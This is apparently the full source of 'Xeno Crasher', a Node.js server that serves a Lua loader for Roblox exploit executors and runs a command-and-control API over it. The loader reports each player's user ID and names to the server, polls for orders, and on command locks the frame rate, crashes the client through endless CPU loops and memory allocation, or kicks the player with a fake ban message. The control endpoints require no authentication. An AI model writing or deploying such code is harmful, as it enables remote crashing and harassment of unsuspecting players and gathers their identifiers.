const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const PUBLIC_URL = process.env.PUBLIC_URL || 'https://crasherscript-production.up.railway.app';

app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'X-Api-Key']
}));
app.use(express.json({ limit: '10mb' }));

const players = new Map();

app.get('/loader.lua', (req, res) => {
    const loader = `--[[ Xeno Crasher - UNIVERSAL ]]--
local BASE = "${PUBLIC_URL}"
local KEY = "xenooooo"

local HttpService = game:GetService("HttpService")
HttpService.HttpEnabled = true

local function findHttpFunction()
    local functions = {
        function() return syn and syn.request end,
        function() return request end,
        function() return http and http.request end,
        function() return fluxus and fluxus.request end,
        function() return http_request end,
        function() 
            local env = getgenv and getgenv() or getrenv and getrenv() or _G
            return env and env.request
        end,
        function() return shared and shared.request end,
        function() return HttpService.RequestAsync end,
    }
    
    for _, getFunc in ipairs(functions) do
        local success, func = pcall(getFunc)
        if success and type(func) == "function" then
            return func
        end
    end
    
    return function(options)
        if options.Method == "POST" then
            return HttpService:PostAsync(options.Url, options.Body or "", Enum.HttpContentType.ApplicationJson)
        else
            return HttpService:GetAsync(options.Url)
        end
    end
end

local request = findHttpFunction()

local function sendRequest(method, url, data)
    local options = {
        Url = url,
        Method = method,
        Headers = {
            ["Content-Type"] = "application/json",
            ["X-Api-Key"] = KEY
        }
    }
    if method == "POST" and data then
        options.Body = data
    end
    
    local success, result = pcall(function()
        return request(options)
    end)
    
    if success and result then
        if type(result) == "table" and result.Body then
            return result.Body
        elseif type(result) == "string" then
            return result
        end
    end
    return nil
end

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LP = Players.LocalPlayer

if not LP then
    local deadline = tick() + 30
    repeat task.wait(0.1) LP = Players.LocalPlayer until LP or tick() > deadline
end
if not LP then return end

local function createGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "XenoCrasherGUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = LP:WaitForChild("PlayerGui")
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 220, 0, 60)
    frame.Position = UDim2.new(0.5, -110, 0.9, 0)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BackgroundTransparency = 0.4
    frame.BorderSizePixel = 2
    frame.BorderColor3 = Color3.fromRGB(100, 255, 100)
    frame.Parent = screenGui
    
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 0, 30)
    label.Text = "✅ Xeno Crasher"
    label.TextColor3 = Color3.fromRGB(100, 255, 100)
    label.BackgroundTransparency = 1
    label.Font = Enum.Font.SourceSansBold
    label.TextSize = 14
    label.Parent = frame
    
    local status = Instance.new("TextLabel")
    status.Size = UDim2.new(1, 0, 0, 20)
    status.Position = UDim2.new(0, 0, 0, 30)
    status.Text = "🟢 Connecting..."
    status.TextColor3 = Color3.fromRGB(150, 150, 150)
    status.BackgroundTransparency = 1
    status.Font = Enum.Font.SourceSans
    status.TextSize = 11
    status.Parent = frame
    
    return screenGui, status
end

local gui, statusLabel = createGUI()

local function heartbeat()
    local data = HttpService:JSONEncode({
        user_id = LP.UserId,
        username = LP.Name,
        display_name = LP.DisplayName,
        executor = "XenoClient",
        online = true
    })
    
    local result = sendRequest("POST", BASE .. "/api/public/heartbeat", data)
    if result then
        statusLabel.Text = "🟢 Connected"
    else
        local url = BASE .. "/api/public/heartbeat?user_id=" .. LP.UserId 
            .. "&username=" .. HttpService:UrlEncode(LP.Name)
            .. "&display_name=" .. HttpService:UrlEncode(LP.DisplayName)
            .. "&executor=XenoClient&online=true"
        result = sendRequest("GET", url, nil)
        if result then
            statusLabel.Text = "🟢 Connected (GET)"
        else
            statusLabel.Text = "⚠️ No connection"
        end
    end
end

local fpsConnection = nil
local fpsActive = false

local function setFPSLimit(targetFPS)
    if fpsConnection then
        fpsConnection:Disconnect()
        fpsConnection = nil
        fpsActive = false
    end
    if not targetFPS or targetFPS <= 0 then
        statusLabel.Text = "🟢 FPS off"
        return
    end
    fpsActive = true
    local frameTime = 1 / targetFPS
    statusLabel.Text = "🎯 FPS: " .. targetFPS
    fpsConnection = RunService.RenderStepped:Connect(function()
        local startTime = tick()
        while tick() - startTime < frameTime and fpsActive do end
    end)
end

local pollRunning = false
local function poll()
    if pollRunning then return end
    pollRunning = true
    local url = BASE .. "/api/public/command?user_id=" .. LP.UserId
    local result = sendRequest("GET", url, nil)
    if result and result ~= "" then
        local data = HttpService:JSONDecode(result)
        if data.fps_limit then
            setFPSLimit(tonumber(data.fps_limit))
        else
            setFPSLimit(nil)
        end
        if data.crash == true then
            statusLabel.Text = "💥 CRASHING!"
            task.spawn(function()
                while true do
                    local x = 0
                    for i = 1, 1000000 do x = x + i end
                end
            end)
            task.spawn(function()
                local t = {}
                while true do
                    for i = 1, 1000 do t[#t + 1] = string.rep("X", 50000) end
                    task.wait()
                end
            end)
        end
        if data.kick == true then
            task.wait(0.5)
            LP:Kick("You have been banned.")
        end
    end
    pollRunning = false
end

print("🚀 Starting Xeno Crasher...")
heartbeat()
task.wait(3)
task.spawn(function()
    while true do
        poll()
        task.wait(0.5)
    end
end)
task.spawn(function()
    while true do
        heartbeat()
        task.wait(5)
    end
end)
print("✅ Xeno Crasher loaded!")
print("👤 Player: " .. LP.Name)`;

    res.setHeader('Content-Type', 'text/plain');
    res.send(loader);
});

// ============================================
// API ENDPOINTS
// ============================================

app.get('/api/public/heartbeat', (req, res) => {
    const { user_id, username, display_name, executor, online } = req.query;
    if (!user_id) {
        return res.status(400).json({ error: 'Missing user_id' });
    }
    const userId = String(user_id);
    
    const existing = players.get(userId) || {};
    players.set(userId, {
        ...existing,
        user_id: userId,
        username: username || existing.username || 'Unknown',
        display_name: display_name || existing.display_name || '',
        executor: executor || existing.executor || 'Unknown',
        online: online === 'true',
        lastHeartbeat: Date.now(),
        _crash: false,
        _kick: false,
        fps_limit: false
    });
    
    console.log(`❤️ Heartbeat (GET) from: ${username || userId}`);
    res.json({ status: 'ok' });
});

app.post('/api/public/heartbeat', (req, res) => {
    const data = req.body;
    if (!data || !data.user_id) {
        return res.status(400).json({ error: 'Missing user_id' });
    }
    const userId = String(data.user_id);
    
    const existing = players.get(userId) || {};
    players.set(userId, {
        ...existing,
        ...data,
        user_id: userId,
        online: true,
        lastHeartbeat: Date.now(),
        _crash: false,
        _kick: false,
        fps_limit: false
    });
    
    console.log(`❤️ Heartbeat (POST) from: ${data.username || userId}`);
    res.json({ status: 'ok' });
});

app.get('/api/players', (req, res) => {
    const list = [];
    const now = Date.now();
    const OFFLINE_THRESHOLD = 15000;

    for (const [id, p] of players.entries()) {
        const timeSinceLast = now - (p.lastHeartbeat || 0);
        const online = timeSinceLast < OFFLINE_THRESHOLD;
        p.online = online;
        list.push({ ...p });
        players.set(id, p);
    }
    res.json({ players: list });
});

app.post('/api/command', (req, res) => {
    const { user_id, fps_limit, kick, crash } = req.body;
    if (!user_id) return res.status(400).json({ error: 'Missing user_id' });
    const userId = String(user_id);
    const p = players.get(userId);
    if (!p) return res.status(404).json({ error: 'Player not found' });
    
    if (fps_limit !== undefined) {
        p.fps_limit = parseInt(fps_limit) || false;
        console.log(`🎯 FPS set to ${p.fps_limit} for: ${p.username || userId}`);
    }
    if (kick === true) {
        p._kick = true;
        console.log(`👢 KICK SENT TO: ${p.username || userId}`);
    }
    if (crash === true) {
        p._crash = true;
        console.log(`💥 CRASH SENT TO: ${p.username || userId}`);
    }
    
    players.set(userId, p);
    res.json({ status: 'ok' });
});

app.get('/api/public/command', (req, res) => {
    const userId = req.query.user_id;
    if (!userId) return res.status(400).json({ error: 'Missing user_id' });
    const p = players.get(String(userId));
    if (!p) return res.json({});
    
    const response = {};
    if (p.fps_limit) {
        response.fps_limit = p.fps_limit;
        p.fps_limit = false;
    }
    if (p._crash) {
        response.crash = true;
        p._crash = false;
    }
    if (p._kick) {
        response.kick = true;
        p._kick = false;
    }
    players.set(String(userId), p);
    res.json(response);
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log(`🚀 Xeno Crasher Server running on port ${PORT}`);
    console.log(`📍 Public URL: ${PUBLIC_URL}`);
});
